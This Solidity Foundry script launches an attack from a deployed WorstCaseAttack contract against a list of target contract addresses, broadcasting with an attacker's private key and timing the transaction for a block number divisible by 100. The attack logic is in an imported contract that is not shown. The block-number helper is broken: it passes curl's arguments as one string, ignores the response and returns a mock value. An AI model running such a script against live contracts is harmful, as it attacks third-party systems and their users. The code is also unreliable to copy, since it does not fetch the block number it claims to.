// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";
import {console} from "../lib/forge-std/src/console.sol";
import "../src/WorstCaseAttack.sol";
import "../src/AddressList.sol";

/**
 * @title TargetSpecificBlock
 * @dev Script to execute the attack targeting blocks divisible by 100
 */
contract TargetSpecificBlockScript is Script {
    // Address of the deployed attack contract
    address public attackContractAddress;
    
    function setUp() public {
        // Set the address of the deployed contract
        attackContractAddress = vm.envAddress("ATTACK_CONTRACT");
    }
    
    function run() external {
        // Fetch RPC URL and private key
        string memory rpcUrl = vm.envString("ETH_RPC_URL");
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        // Get target contract addresses from the library
        address[] memory targetContracts = AddressList.getTargetAddresses();
        
        // Get current block number
        uint256 currentBlock = getCurrentBlockNumber(rpcUrl);
        console.log("Current block number:", currentBlock);
        
        // Calculate the next block that is divisible by 100
        uint256 targetBlock = ((currentBlock / 100) + 1) * 100;
        console.log("Target block number:", targetBlock);
        uint256 blocksUntilTarget = targetBlock - currentBlock;
        console.log("Blocks until target:", blocksUntilTarget);
        
        if (blocksUntilTarget > 10) {
            console.log("Target block is too far away. Please run closer to the target block.");
            return;
        }
        
        // Show approximate time until target block (assuming ~12 second blocks)
        console.log("Estimated time until target block: ~%d seconds", blocksUntilTarget * 12);
        
        // Wait for user confirmation
        console.log("Press Enter to continue with transaction submission...");
        string memory confirmation = vm.readLine("Press Enter to continue: ");
        
        // Get reference to the attack contract
        WorstCaseAttack attackContract = WorstCaseAttack(attackContractAddress);
        
        // Start broadcasting transactions
        vm.startBroadcast(attackerPrivateKey);
        
        // Execute the attack, targeting inclusion in the desired block
        console.log("Executing attack targeting block", targetBlock);
        attackContract.executeAttack(targetContracts);
        
        console.log("Attack transaction submitted!");
        
        vm.stopBroadcast();
    }
    
    function getCurrentBlockNumber(string memory rpcUrl) internal returns (uint256) {
        // Use a curl command to fetch the current block number
        string[] memory inputs = new string[](3);
        inputs[0] = "curl";
        inputs[1] = "-s";
        inputs[2] = string.concat(
            rpcUrl,
            " -X POST -H \"Content-Type: application/json\" --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_blockNumber\",\"params\":[],\"id\":1}'"
        );
        
        // Execute the command
        bytes memory result = vm.ffi(inputs);
        
        // Parse the result (this is a simplified implementation)
        // In a real implementation, you'd want to properly parse the JSON response
        string memory resultStr = string(result);
        
        // For now, we'll just return a mock block number for illustration
        // In practice, you'd extract the actual block number from the JSON response
        return block.number;
    }
} 